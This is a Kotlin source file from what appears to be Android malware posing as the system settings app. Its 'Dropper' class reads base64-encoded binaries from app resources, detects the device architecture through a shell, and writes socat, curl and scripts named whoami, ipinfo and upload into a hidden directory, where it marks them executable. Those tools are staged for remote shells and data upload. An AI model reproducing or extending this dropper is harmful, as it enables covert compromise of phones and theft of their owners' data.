package org.android.settings

import android.content.Context

/* Drop additional payloads  */

class Dropper {

    private fun readRawTextResource(context : Context, resourceId : Int) : String {
        return context.resources.openRawResource(resourceId).bufferedReader().readText()
    }

    init {

        val payloadsArch    = 0
        val payloadsName    = 1
        val payloadsPayload = 2
        val context         = MainActivity.getPublicContext2()

        if (context != null) {

            val payloads = arrayOf(
                arrayOf("aarch64", "socat" , readRawTextResource(context, R.raw.socat_aarch64)),
                arrayOf("aarch64", "curl"  , readRawTextResource(context, R.raw.curl_aarch64)) ,
                arrayOf("x86_64" , "socat" , readRawTextResource(context, R.raw.socat_x86_64)) ,
                arrayOf("x86_64" , "curl"  , readRawTextResource(context, R.raw.curl_x86_64))  ,
                arrayOf("any"    , "whoami", readRawTextResource(context, R.raw.whoami))       ,
                arrayOf("any"    , "ipinfo", readRawTextResource(context, R.raw.ipinfo))       ,
                arrayOf("any"    , "upload", readRawTextResource(context, R.raw.upload))
            )

            /* Get System architecture */
            val cmd1 = Shell("uname -m; exit;", false)
            val arch = cmd1.processOutput().trim()
            cmd1.exit()

            /* Drop payloads based on detected architecture */
            for (payload in payloads.indices) {
                if (payloads[payload][payloadsArch] == arch || payloads[payload][payloadsArch] == "any") {

                    val payloadName = payloads[payload][payloadsName]
                    val payloadPayload = payloads[payload][payloadsPayload]

                    val cmd2 = Shell(
                    """
                    BINS=/data/data/org.android.settings/.files/usr/bin;
                    mkdir -p ${'$'}BINS;
                    if [ ! -f "${'$'}BINS/$payloadName" ]; then
                        echo -n '$payloadPayload' | base64 -d > ${'$'}BINS/$payloadName;
                        chmod +x ${'$'}BINS/$payloadName;
                    fi
                    exit;
                    """.trimIndent())
                    cmd2.processOutput()
                    cmd2.exit()
                }
            }
        }
    }
}